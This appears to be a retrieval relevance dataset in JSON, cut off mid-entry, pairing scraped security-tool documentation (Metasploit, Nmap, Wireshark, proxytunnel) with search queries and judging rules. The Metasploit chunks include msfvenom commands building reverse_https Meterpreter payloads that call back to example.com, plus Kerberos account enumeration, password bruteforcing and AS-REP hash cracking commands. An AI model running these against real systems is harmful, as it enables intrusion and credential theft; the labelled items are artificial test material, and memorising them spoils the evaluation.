@@ -1,0 +1,370 @@
+{
+  "documents": [
+    {
+      "chunk_id": "329-0",
+      "doc_id": 329,
+      "title": "Payload UUID | Metasploit Documentation Penetration Testing Software, Pen Testing Security",
+      "url": "https://docs.metasploit.com/docs/using-metasploit/intermediate/payload-uuid.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 5480,
+      "body": "In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The source code comments go into more detail. In the case of HTTP payloads, the 16-byte UUID value is encoded in base64url format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established. The goal of Payload UUIDs is three-fold: Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing. Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers. Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures. Specifying the UUID Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the PayloadUUIDRaw option. This option takes a 8-byte hex string, such as “0011223344556677”. For example: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe Tracking the UUID Payload UUIDs are enabled by default, but are not tracked unless the PayloadUUIDTracking option is set to true . Setting this option causes a new entry to be created in ~/.msf4/payloads.json when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the PayloadUUIDName . The example below will create a new registered payload with a custom name: $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe $ cat ~/.msf4/payloads.json { \"68017d72958c40f6\": { \"arch\": \"x86\", \"platform\": \"windows\", \"timestamp\": 1435277049, \"payload\": \"payload/windows/meterpreter/reverse_https\", \"datastore\": {\"AutoLoadStdapi\":true,\"AutoRunScript\":\"\",\"AutoSystemInfo\":true,\"AutoVerifySession\":true,\"AutoVerifySessionTimeout\":30,\"EXITFUNC\":\"process\",\"EnableStageEncoding\":false,\"EnableUnicodeEncoding\":false,\"HttpUnknownRequestResponse\":\"\\u003Chtml\\u003E\\u003Cbody\\u003E\\u003Ch1\\u003EIt works!\\u003C/h1\\u003E\\u003C/body\\u003E\\u003C/html\\u003E\",\"IgnoreUnknownPayloads\":false,\"InitialAutoRunScript\":\"\",\"LHOST\":\"127.1.1.1\",\"LPORT\":4444,\"MeterpreterServerName\":\"Apache\",\"MeterpreterUserAgent\":\"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\",\"OverrideRequestHost\":false,\"PAYLOADUUIDNAME\":\"EmailCampaign20150101\",\"PayloadProxyPort\":0,\"PayloadProxyType\":\"HTTP\",\"PayloadUUIDTracking\":true,\"PrependMigrate\":false,\"ReverseListenerBindPort\":0,\"SessionCommunicationTimeout\":300,\"SessionExpirationTimeout\":604800,\"SessionRetryTotal\":3600,\"SessionRetryWait\":10,\"StageEncoderSaveRegisters\":\"\",\"StageEncodingFallback\":true,\"StagerRetryCount\":10,\"StagerURILength\":0,\"StagerVerifySSLCert\":false,\"VERBOSE\":false}, \"name\": \"EmailCampaign20150101\", \"urls\": [ \"/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi\" ] } } Once this payload is launched, the output of the sessions -l -v command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID: msf exploit ( handler ) > run -j [*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ... [*] Meterpreter session 1 opened (127.1.1.1:4444 -> 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700 msf exploit ( handler ) > sessions -l -v Active sessions =============== Session ID: 1 Type: meterpreter x86/win32 Info: fang\\hdm @ fang Tunnel: 127.1.1.1:4444 -> 127.0.0.1:36235 (127.0.0.1) Via: exploit/multi/handler UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700 Registered: Yes - Name=\"EmailCampaign20150101\" Whitelisting UUIDs The ~/.msf4/payloads.json file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting for HTTP payloads, set the IgnoreUnknownPayloads option to true in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The payloads.json file can be copied between Metasploit Framework instances and even hand-edited while the framework is running.",
+      "requests": [
+        {
+          "decision_id": "42bcb0e11ebaa32d7a21-0",
+          "query": "generate metasploit payload",
+          "information_need": "Create a payload using Metasploit tooling.",
+          "rule": "Explains payload generation rather than an unrelated API definition."
+        },
+        {
+          "decision_id": "82e2995ad5576dd57523-0",
+          "query": "reverse shell payload",
+          "information_need": "User wants to get a reverse shell on a target.",
+          "rule": "Relevant if the page explains how to create or catch a reverse shell (e.g. msfvenom payloads, GTFOBins reverse-shell entries, netcat)."
+        }
+      ]
+    },
+    {
+      "chunk_id": "883-0",
+      "doc_id": 883,
+      "title": "proxytunnel | Kali Linux Tools",
+      "url": "https://www.kali.org/tools/proxytunnel/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 2555,
+      "body": "Packages and Binaries: proxytunnel Help SSH and other protocols through HTTP(S) proxies Proxytunnel creates tunnels through HTTP(S) proxies for any TCP based protocol. It comes in handy when one sits behind a firewall that allows for HTTP(S) traffic only. The program connects stdin and stdout to an origin server somewhere in the Internet through an industry standard HTTP or HTTPS proxy. It was originally written as an extension to SSH, to be used to SSH to a box at home. It’s possible to use proxytunnel along with other applications as well, by running it from inetd or as daemon listening on a local port to be forwarded through the tunnel. Installed size: 98 KB How to install: sudo apt install proxytunnel Dependencies: libc6 libssl3t64 proxytunnel Program to tunnel a connection through a standard HTTPS proxy root@kali:~# proxytunnel -h proxytunnel 1.13.0 Copyright 2001-2026 Proxytunnel Project Usage: proxytunnel [OPTIONS]... Build generic tunnels through HTTPS proxies using HTTP authentication Standard options: -i, --inetd Run from inetd (default: off) -a, --standalone=STRING Run as standalone daemon on specified port or address:port combination -p, --proxy=STRING Local proxy host:port combination -r, --remproxy=STRING Remote proxy host:port combination (using 2 proxies) -d, --dest=STRING Destination host:port combination -e, --encrypt SSL encrypt data between local proxy and destination -E, --encrypt-proxy SSL encrypt data between client and local proxy -X, --encrypt-remproxy SSL encrypt data between local and remote proxy Additional options for specific features: -z, --no-check-certificate Don't verify server SSL certificate -C, --cacert=STRING Path to trusted CA certificate or directory -4, --ipv4 Enforce IPv4 connection to local proxy -6, --ipv6 Enforce IPv6 connection to local proxy -F, --passfile=STRING File with credentials for proxy authentication -P, --proxyauth=STRING Proxy auth credentials user:pass combination -R, --remproxyauth=STRING Remote proxy auth credentials user:pass combination -c, --cert=FILENAME client SSL certificate (chain) -k, --key=FILENAME client SSL key -N, --ntlm Use NTLM based authentication -t, --domain=STRING NTLM domain (default: autodetect) -H, --header=STRING Add additional HTTP headers to send to proxy -o, --host=STRING Send custom Host Header/SNI -x, --proctitle=STRING Use a different process title -I, --no-sni Disable SNI Miscellaneous options: -v, --verbose Turn on verbosity -q, --quiet Suppress messages -h, --help Print help and exit -V, --version Print version and exit",
+      "requests": [
+        {
+          "decision_id": "1ec0cf392b67fd059657-0",
+          "query": "install proxy certificate android",
+          "information_need": "Trust an interception proxy CA on Android.",
+          "rule": "Explains Android certificate installation/trust for proxy inspection."
+        }
+      ]
+    },
+    {
+      "chunk_id": "194-0",
+      "doc_id": 194,
+      "title": "Host Discovery Controls | Nmap Network Scanning",
+      "url": "https://nmap.org/book/host-discovery-controls.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 11133,
+      "body": "Host Discovery Controls By default, Nmap will include a ping scanning stage prior to more intrusive probes such as port scans, OS detection, Nmap Scripting Engine, or version detection. Nmap usually only performs intrusive scans on machines that are shown to be available during the ping scan stage. This saves substantial time and bandwidth compared to performing full scans against every single IP address. Yet this approach is not ideal for all circumstances. There are times when you do want to scan every IP ( -Pn ), and other times when you want to perform host discovery without a port scan ( -sn ). There are even times when you want to print out the target hosts and exit prior to even sending ping probes ( -sL ). Nmap offers several high-level options to control this behavior. List Scan ( -sL ) List scan is a degenerate form of host discovery that simply lists each host on the network(s) specified, without sending any packets to the target hosts. By default, Nmap still performs reverse-DNS resolution on the hosts to learn their names. Nmap also reports the total number of IP addresses at the end. List scan is a good sanity check to ensure that you have proper IP addresses for your targets. If the hosts display domain names you do not recognize, it is worth investigating further to prevent scanning the wrong company's network. There are many reasons target IP ranges can be incorrect. Even network administrators can mistype their own netblocks, and pen-testers have even more to worry about. In some cases, security consultants are given the wrong addresses. In others, they try to find proper IP ranges through resources such as whois databases and routing tables. The databases can be out of date, or the company could be loaning IP space to other organizations. Whether to scan corporate parents, siblings, service providers, and subsidiaries is an important issue that should be worked out with the customer in advance. A preliminary list scan helps confirm exactly what targets are being scanned. Another reason for an advance list scan is stealth. In some cases, you do not want to begin with a full-scale assault on the target network that is likely to trigger IDS alerts and bring unwanted attention. A list scan is unobtrusive and provides information that may be useful in choosing which individual machines to target. It is possible, though highly unlikely, that the target will notice all of the reverse-DNS requests. When that is a concern, you can bounce through anonymous recursive DNS servers using the --dns-servers option as described in the section called “DNS proxying” . A list scan is specified with the -sL command-line option. Since the idea is to simply print a list of target hosts, options for higher level functionality such as port scanning, OS detection, or ping scanning cannot be combined with -sL . If you wish to disable ping scanning while still performing such higher level functionality, read up on the -Pn option. Example 3.6 shows list scan being used to enumerate the CIDR /28 network range (16 IP addresses) surrounding the main Stanford University web server. Example 3.6. Enumerating hosts surrounding www.stanford.edu with list scan felix~> nmap -sL www.stanford.edu/28 Starting Nmap ( https://nmap.org ) Host www9.Stanford.EDU (171.67.16.80) not scanned Host www10.Stanford.EDU (171.67.16.81) not scanned Host scriptorium.Stanford.EDU (171.67.16.82) not scanned Host coursework-a.Stanford.EDU (171.67.16.83) not scanned Host coursework-e.Stanford.EDU (171.67.16.84) not scanned Host www3.Stanford.EDU (171.67.16.85) not scanned Host leland-dev.Stanford.EDU (171.67.16.86) not scanned Host coursework-preprod.Stanford.EDU (171.67.16.87) not scanned Host stanfordwho-dev.Stanford.EDU (171.67.16.88) not scanned Host workgroup-dev.Stanford.EDU (171.67.16.89) not scanned Host courseworkbeta.Stanford.EDU (171.67.16.90) not scanned Host www4.Stanford.EDU (171.67.16.91) not scanned Host coursework-i.Stanford.EDU (171.67.16.92) not scanned Host leland2.Stanford.EDU (171.67.16.93) not scanned Host coursework-j.Stanford.EDU (171.67.16.94) not scanned Host 171.67.16.95 not scanned Nmap done: 16 IP addresses (0 hosts up) scanned in 0.38 seconds Disable Port Scan ( -sn ) This option tells Nmap not to run a port scan after host discovery. When used by itself, it makes Nmap do host discovery, then print out the available hosts that responded to the scan. This is often called a “ ping scan ” . Even though no port scanning is done, you can still request Nmap Scripting Engine ( --script ) host scripts and traceroute probing ( --traceroute ). A ping-only scan is one step more intrusive than a list scan, and can often be used for the same purposes. It performs light reconnaissance of a target network quickly and without attracting much attention. Knowing how many hosts are up is more valuable to attackers than the list of every single IP and host name provided by list scan. Systems administrators often find this option valuable as well. It can easily be used to count available machines on a network or monitor server availability. This is often called a ping sweep, and is more reliable than pinging the broadcast address because many hosts do not reply to broadcast queries. Example 3.7 shows a quick ping scan against the CIDR /24 (256 IPs) surrounding one of my favorite web sites, Linux Weekly News. Example 3.7. Discovering hosts surrounding www.lwn.net with a ping scan # nmap -sn -T4 www.lwn.net/24 Starting Nmap ( https://nmap.org ) Host 66.216.68.0 seems to be a subnet broadcast address (returned 1 extra ping) Host 66.216.68.1 appears to be up. Host 66.216.68.2 appears to be up. Host 66.216.68.3 appears to be up. Host server1.camnetsec.com (66.216.68.10) appears to be up. Host akqa.com (66.216.68.15) appears to be up. Host asria.org (66.216.68.18) appears to be up. Host webcubic.net (66.216.68.19) appears to be up. Host dizzy.yellowdog.com (66.216.68.22) appears to be up. Host www.outdoorwire.com (66.216.68.23) appears to be up. Host www.inspectorhosting.com (66.216.68.24) appears to be up. Host jwebmedia.com (66.216.68.25) appears to be up. [...] Host rs.lwn.net (66.216.68.48) appears to be up. Host 66.216.68.52 appears to be up. Host cuttlefish.laughingsquid.net (66.216.68.53) appears to be up. [...] Nmap done: 256 IP addresses (105 hosts up) scanned in 12.69 seconds This example only took 13 seconds, but provides valuable information. In that class C sized address range, 105 hosts are online. From the unrelated domain names all packed into such a small IP space, it is clear that LWN uses a colocation or dedicated server provider. If the LWN machines turn out to be highly secure, an attacker might go after one of those neighbor machines and then perform a local ethernet attack with tools such as Ettercap or Dsniff . An ethical use of this data would be a network administrator considering moving machines to this provider. He might e-mail a few of the listed organizations and ask their opinion of the service before signing a long-term contract or making the expensive and disruptive datacenter move. The -sn option sends an ICMP echo request, a TCP SYN packet to port 443, a TCP ACK packet to port 80, and an ICMP timestamp request by default. Since unprivileged Unix users (or Windows users without Npcap installed) cannot send these raw packets, only SYN packets are sent instead in those cases. The SYN packet is sent using a TCP connect system call to ports 80 and 443 of the target host. When a privileged user tries to scan targets on a local ethernet network, ARP requests ( -PR ) are used unless the --send-ip option is specified. The -sn option can be combined with any of the techniques discussed in the section called “Host Discovery Techniques” for greater flexibility. If any of those probe type and port number options are used, the default probes are overridden. When strict firewalls are in place between the source host running Nmap and the target network, using those advanced techniques is recommended. Otherwise hosts could be missed when the firewall drops probes or their responses. Disable Ping ( -Pn ) Another option is to skip the Nmap discovery stage altogether. Normally, Nmap uses this stage to determine active machines for heavier scanning. By default, Nmap only performs heavy probing such as port scans, version detection, or OS detection against hosts that are found to be up. Disabling host discovery with the -Pn option causes Nmap to attempt the requested scanning functions against every target IP address specified. So if a class B sized target address space (/16) is specified on the command line, all 65,536 IP addresses are scanned. Proper host discovery is skipped as with a list scan, but instead of stopping and printing the target list, Nmap continues to perform requested functions as if each target IP is active. There are many reasons for disabling the Nmap ping tests. One of the most common is intrusive vulnerability assessments. One can specify dozens of different ping probes in an attempt to elicit a response from all available hosts, but it is still possible that an active yet heavily firewalled machine might not reply to any of those probes. So to avoid missing anything, auditors frequently perform intense scans, such as for all 65,536 TCP ports, against every IP on the target network. It may seem wasteful to send hundreds of thousands of packets to IP addresses that probably have no host listening, and it can slow scan times by an order of magnitude or more. Nmap must send retransmissions to every port in case the original probe was dropped in transit, and Nmap must spend substantial time waiting for responses because it has no round-trip-time (RTT) estimate for these non-responsive IP addresses. But serious penetration testers are willing to pay this price to avoid even a slight risk of missing active machines. They can always do a quick scan as well, leaving the massive -Pn scan to run in the background while they work. Chapter 6, Optimizing Nmap Performance provides more performance tuning advice. Another frequent reason given for using -Pn is that the tester has a list of machines that are already known to be up. So the user sees no point in wasting time with the host discovery stage. The user creates their own list of active hosts and then passes it to Nmap using the -iL (take input from list) option. This strategy is rarely beneficial from a time-saving perspective. Due to the retransmission and RTT estimate issues discussed in the previous paragraph, even one unresponsive IP address in a large list will often take more time to scan than a whole ping scanning stage would have. In addition, the ping stage allows Nmap to gather RTT samples that can speed up the following port scan, particularly if the target host has strict firewall rules. While specifying -Pn is rarely helpful as a time saver, it is important if some of the machines on your list block all of the discovery techniques that would otherwise be specified. Users must strike a balance between scan speed and the possibility of missing heavily cloaked machines.",
+      "requests": [
+        {
+          "decision_id": "075337b91a08a3f8cfd7-0",
+          "query": "nmap host discovery without port scan",
+          "information_need": "Find active hosts without performing a port scan.",
+          "rule": "Explains host-discovery-only workflows; a general port-scan listing is insufficient."
+        },
+        {
+          "decision_id": "48328f9b57462a35df59-0",
+          "query": "recursive web directory discovery",
+          "information_need": "Discover nested directories on a web server.",
+          "rule": "Explains recursive web directory/content discovery."
+        },
+        {
+          "decision_id": "e770a23c224182ce0320-0",
+          "query": "web content discovery",
+          "information_need": "Locate unlinked content on a web server.",
+          "rule": "Documents web directory/file/content discovery."
+        }
+      ]
+    },
+    {
+      "chunk_id": "237-0",
+      "doc_id": 237,
+      "title": "3.13. The “Wireless” Menu",
+      "url": "https://www.wireshark.org/docs/wsug_html_chunked/ChUseWirelessMenuSection.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 699,
+      "body": "3.13. The “Wireless” Menu Chapter 3. User Interface Next 3.13. The “Wireless” Menu The Wireless menu lets you analyze Bluetooth and IEEE 802.11 wireless LAN activity as shown in Figure 3.11, “The “Wireless” Menu” . Figure 3.11. The “Wireless” Menu Each menu item shows specific Bluetooth and IEEE 802.11 statistics. Table 3.11. Wireless menu items Menu Item Accelerator Description Bluetooth ATT Server Attributes See Section 10.2, “Bluetooth ATT Server Attributes” Bluetooth Devices See Section 10.3, “Bluetooth Devices” Bluetooth HCI Summary See Section 10.4, “Bluetooth HCI Summary” WLAN Traffic See Section 10.5, “WLAN Traffic” Prev Up Next 3.12. The “Telephony” Menu Home 3.14. The “Tools” Menu",
+      "requests": [
+        {
+          "decision_id": "97412a0f27a3cfa49999-0",
+          "query": "audit wireless wpa handshake",
+          "information_need": "Find tools for capturing or analyzing WPA authentication handshakes.",
+          "rule": "Documents Wi-Fi/WPA handshake capture or processing."
+        }
+      ]
+    },
+    {
+      "chunk_id": "174-0",
+      "doc_id": 174,
+      "title": "Kerberos login enumeration and bruteforcing | Metasploit Documentation Penetration Testing Software, Pen Testing Security",
+      "url": "https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/kerberos_login.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 5111,
+      "body": "Kerberos Login/Bruteforce The auxiliary/scanner/kerberos/kerberos_login module can verify Kerberos credentials against a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. It will also store kerberos tickets that can be used even after the user’s password has been changed. Kerberos accounts which do not require pre-authentication will have the TGT logged for offline cracking, this technique is known as AS-REP Roasting. This module is able to identify the following information from the KDC: Valid/Invalid accounts Locked/Disabled accounts Accounts with expired passwords, when the password matches AS-REP Roastable accounts Target To use the kerberos_login module, make sure you are able to connect to the Kerberos service on a Domain Controller. Scenarios Creating a single Kerberos ticket (TGT) To create a single Kerberos ticket (TGT), set the username and password options: msf auxiliary ( scanner/kerberos/kerberos_login ) > run rhost=192.168.123.133 domain=DEMO.local username=basic_user password=password verbose=true [*] Using domain: DEMO.LOCAL - 192.168.123.133:88 ... [+] 192.168.123.133 - User found: \"basic_user\" with password password [*] Auxiliary module execution completed Auth Brute The following demonstrates basic usage, using a custom wordlist, targeting a single Domain Controller to identify valid domain user accounts and additionally bruteforcing passwords: Create a new ./users.txt file and ./wordlist.txt , then run the module: msf auxiliary ( gather/kerberos_enumusers ) > run rhost=192.168.123.133 domain=DEMO.local user_file=./users.txt pass_file=./wordlist.txt verbose=true [*] Using domain: DEMO.LOCAL - 192.168.123.133:88 ... [+] 192.168.123.133 - User: \"basic_user\" is present [*] 192.168.123.133 - User: \"basic_user\" wrong password invalid2 [*] 192.168.123.133 - User: \"basic_user\" wrong password p4$$w0rd [*] 192.168.123.133 - User: \"basic_user\" wrong password test_password [+] 192.168.123.133 - User found: \"basic_user\" with password password. Hash: $krb5asrep$23$basic_user@DEMO.LOCAL:959b983f9cffc093002d9cd8a20...etc... [*] 192.168.123.133 - User: \"foo\" user not found [*] 192.168.123.133 - User: \"foo_bar\" user not found [+] 192.168.123.133 - User: \"Administrator\" is present [*] 192.168.123.133 - User: \"Administrator\" wrong password invalid2 [*] 192.168.123.133 - User: \"Administrator\" wrong password p4$$w0rd [*] 192.168.123.133 - User: \"Administrator\" wrong password test_password [*] 192.168.123.133 - User: \"Administrator\" wrong password password [+] 192.168.123.133 - User: \"no_pre_auth\" does not require preauthentication. Hash: $krb5asrep$23$no_pre_auth@DEMO.LOCAL:a714f0553589cbd78...etc... [+] 192.168.123.133 - User: \"admin\" is present [*] 192.168.123.133 - User: \"admin\" wrong password invalid2 [*] 192.168.123.133 - User: \"admin\" - Kerberos Error - KDC_ERR_KEY_EXPIRED (23) - Password has expired - change password to reset [*] 192.168.123.133 - User: \"admin\" wrong password test_password [*] 192.168.123.133 - User: \"admin\" wrong password password [*] Auxiliary module execution completed ASREPRoasting Accounts that have Do not require Kerberos preauthentication enabled, will receive an ASREP response with a ticket-granting-ticket present. The technique of cracking this ticket offline is called ASREPRoasting. Cracking ASREP response with John: john ./hashes.txt --wordlist=./wordlist.txt --format:krb5asrep Cracking ASREP response with Hashcat: hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt You can see previously cracked creds with: creds -v Options The kerberos_login module only requires the RHOST , DOMAIN and USER_FILE options to run. DOMAIN This option is used to specify the target domain. If the domain name is incorrect an error is returned and domain user account enumeration will fail. An example of setting DOMAIN: set DOMAIN [domain name] USER_FILE This option is used to specify the file containing a list of user names to query the Domain Controller to identify if they exist in the target domain or not. One per line. An example of setting USER_FILE: set USER_FILE [path to file] PASS_FILE If you happen to manage all the found passwords in a separate file, then this option would be suitable for that. One per line. set PASS_FILE [path to file] USERPASS_FILE If each user should be using a specific password in your file, then you can use this option. One username/password per line: set USERPASS_FILE [path to file] DB_ALL_CREDS This option allows you to reuse all the user names and passwords collected by the database: set DB_ALL_CREDS true DB_ALL_PASS This option allows you to reuse all the passwords collected by the database. set DB_ALL_PASS true DB_ALL_USERS This option allows you to reuse all the user names collected by the database. set DB_ALL_USERS true Timeout This option is used to specify the TCP timeout i.e. the time to wait before a connection to the Domain Controller is established and data read. An example of setting Timeout: set Timeout [value in seconds]",
+      "requests": [
+        {
+          "decision_id": "02ffbf8b7fd8d7fbe283-0",
+          "query": "identify password hash format",
+          "information_need": "Determine what kind of password hash a value uses.",
+          "rule": "Documents hash identification, not only password cracking."
+        },
+        {
+          "decision_id": "9ec159b8e012bdc77b74-0",
+          "query": "offline password hash recovery",
+          "information_need": "Recover passwords from offline hashes.",
+          "rule": "Documents a hash cracking tool or relevant workflow, not remote login guessing."
+        },
+        {
+          "decision_id": "c1c690dd274f895b11dc-0",
+          "query": "directory enumeration web server",
+          "information_need": "User wants to enumerate directories/files on a web server.",
+          "rule": "Relevant if the page is about web content/directory discovery."
+        }
+      ]
+    },
+    {
+      "chunk_id": "393-0",
+      "doc_id": 393,
+      "title": "Chapter 6. Working With Captured Packets",
+      "url": "https://www.wireshark.org/docs/wsug_html_chunked/ChapterWork.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3566,
+      "body": "Chapter 6. Working With Captured Packets Prev Next Chapter 6. Working With Captured Packets 6.1. Viewing Packets You Have Captured 6.2. Pop-up Menus 6.2.1. Pop-up Menu Of The “Packet List” Column Header 6.2.2. Pop-up Menu Of The “Packet List” Pane 6.2.3. Pop-up Menu Of The “Packet Details” Pane 6.2.4. Pop-up Menu Of The “Packet Bytes” Pane 6.2.5. Pop-up Menu Of The “Packet Diagram” Pane 6.3. Filtering Packets While Viewing 6.4. Building Display Filter Expressions 6.4.1. Display Filter Fields 6.4.2. Comparing Values 6.4.3. Combining Expressions 6.4.4. Slice Operator 6.4.5. The Layer Operator 6.4.6. The At Operator 6.4.7. Membership Operator 6.4.8. Arithmetic operators 6.4.9. Functions 6.4.10. Field References 6.4.11. Implicit type conversions 6.4.12. Sometimes Fields Change Names 6.4.13. Some protocol names can be ambiguous 6.5. The “Display Filter Expression” Dialog Box 6.6. Defining And Saving Filters 6.7. Defining And Saving Filter Macros 6.7.1. Display Filter Macros syntax 6.8. Finding Packets 6.8.1. The “Find Packet” Toolbar 6.8.2. Finding Text in the Selected Packet 6.8.3. Finding Text in the Single-Packet Window 6.9. Go To A Specific Packet 6.9.1. The “Go Back” Command 6.9.2. The “Go Forward” Command 6.9.3. The “Go to Packet” Toolbar 6.9.4. The “Go to Corresponding Packet” Command 6.9.5. The “Go to First Packet” Command 6.9.6. The “Go to Last Packet” Command 6.10. Marking Packets 6.11. Ignoring Packets 6.12. Time Display Formats And Time References 6.12.1. Packet Time Referencing 6.13. Time Shifting Packets 6.1. Viewing Packets You Have Captured Once you have captured some packets or you have opened a previously saved capture file, you can view the packets that are displayed in the packet list pane by simply clicking on a packet in the packet list pane, which will bring up the selected packet in the tree view and byte view panes. You can then expand any part of the tree to view detailed information about each protocol in each packet. Clicking on an item in the tree will highlight the corresponding bytes in the byte view. An example with a TCP packet selected is shown in Figure 6.1, “Wireshark with a TCP packet selected for viewing” . It also has the Acknowledgment number in the TCP header selected, which shows up in the byte view as the selected bytes. Figure 6.1. Wireshark with a TCP packet selected for viewing You can also select and view packets the same way while Wireshark is capturing if you selected “Update list of packets in real time” in the “Capture Preferences” dialog box. In addition you can view individual packets in a separate window as shown in Figure 6.2, “Viewing a packet in a separate window” . You can do this by double-clicking on an item in the packet list or by selecting the packet in which you are interested in the packet list pane and selecting View → Show Packet in New Window . This allows you to easily compare two or more packets, even across multiple files. The single-packet window also has its own find bar for searching within that packet’s protocol tree: see Section 6.8.3, “Finding Text in the Single-Packet Window” . Figure 6.2. Viewing a packet in a separate window Along with double-clicking the packet list and using the main menu there are a number of other ways to open a new packet window: Hold down the shift key and double-click on a frame link in the packet details. From Table 6.2, “The menu items of the “Packet List” pop-up menu” . From Table 6.3, “The menu items of the “Packet Details” pop-up menu” . Prev Next 5.10. The Packet Format Frame Home 6.2. Pop-up Menus",
+      "requests": [
+        {
+          "decision_id": "65950f23a68e00837e53-0",
+          "query": "replay captured http requests",
+          "information_need": "Send captured HTTP requests again.",
+          "rule": "Explains request/client replay in an HTTP analysis tool."
+        },
+        {
+          "decision_id": "b63aa5385159283b4370-0",
+          "query": "network packet sniffer",
+          "information_need": "User wants to capture/analyze network traffic.",
+          "rule": "Relevant if the page is about packet capture/sniffing."
+        },
+        {
+          "decision_id": "e2bc6675c9ca77f90c13-0",
+          "query": "filter packets by ip address",
+          "information_need": "Show captured packets for a chosen IP address.",
+          "rule": "Provides relevant packet filtering guidance."
+        }
+      ]
+    },
+    {
+      "chunk_id": "264-0",
+      "doc_id": 264,
+      "title": "3.18. The “Packet List” Pane",
+      "url": "https://www.wireshark.org/docs/wsug_html_chunked/ChUsePacketListPaneSection.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3572,
+      "body": "3.18. The “Packet List” Pane Chapter 3. User Interface Next 3.18. The “Packet List” Pane The packet list pane displays all the packets in the current capture file. Figure 3.16. The “Packet List” pane Each line in the packet list corresponds to one packet in the capture file. If you select a line in this pane, more details will be displayed in the “Packet Details” and “Packet Bytes” panes. You can move to the next or previous packet using the ↓ and ↑ keys respectively when the packet list is in focus. You can also use the Ctrl + ↓ or F8 and Ctrl + ↑ or F7 keys to move to the next or previous packet even if the packet list is not in focus. Holding down ↓ and ↑ will move rapidly through the packet list. While dissecting a packet, Wireshark will place information from the protocol dissectors into the columns. As higher-level protocols might overwrite information from lower levels, you will typically see the information from the highest possible level only. For example, let’s look at a packet containing TCP inside IP inside an Ethernet packet. The Ethernet dissector will write its data (such as the Ethernet addresses), the IP dissector will overwrite this by its own (such as the IP addresses), the TCP dissector will overwrite the IP information, and so on. There are many different columns available. You can choose which columns are displayed in the preferences. See Section 11.6, “Preferences” . The default columns will show: No. The number of the packet in the capture file. This number won’t change, even if a display filter is used. Time The timestamp of the packet. The presentation format of this timestamp can be changed, see Section 6.12, “Time Display Formats And Time References” . Delta The delta time from the previous displayed packet. Source The address where this packet is coming from. Destination The address where this packet is going to. Protocol The protocol name in a short (perhaps abbreviated) version. Length The length of each packet. Info Additional information about the packet content. The first column shows how each packet is related to the selected packet. For example, in the image above the first packet is selected, which is a DNS request. Wireshark shows a rightward arrow for the request itself, followed by a leftward arrow for the response in packet 2. Why is there a dashed line? There are more DNS packets further down that use the same port numbers. Wireshark treats them as belonging to the same conversation and draws a line connecting them. Table 3.16. Related packet symbols First packet in a conversation. Part of the selected conversation. Not part of the selected conversation. Last packet in a conversation. Request. Response. The selected packet acknowledges this packet. The selected packet is a duplicate acknowledgement of this packet. The selected packet is related to this packet in some other way, e.g., as part of reassembly. The packet list has an Intelligent Scrollbar which shows a miniature map of nearby packets. Each raster line of the scrollbar corresponds to a single packet, so the number of packets shown in the map depends on your physical display and the height of the packet list. A tall packet list on a high-resolution (“Retina”) display will show you quite a few packets. In the image above the scrollbar shows the status of more than 500 packets along with the 15 shown in the packet list itself. Right clicking will show a context menu, described in Figure 6.4, “Pop-up menu of the “Packet List” pane” . Prev Up Next 3.17. The “Filter” Toolbar Home 3.19. The “Packet Details” Pane",
+      "requests": [
+        {
+          "decision_id": "9e8236a56d9b9a1f9073-0",
+          "query": "filter packets by ip address",
+          "information_need": "Show captured packets for a chosen IP address.",
+          "rule": "Provides relevant packet filtering guidance."
+        }
+      ]
+    },
+    {
+      "chunk_id": "377-0",
+      "doc_id": 377,
+      "title": "Community Contributions | Nmap Network Scanning",
+      "url": "https://nmap.org/book/vscan-community.html",
+      "description": "",
+      "body_start": 0,
+      "body_end": 7069,
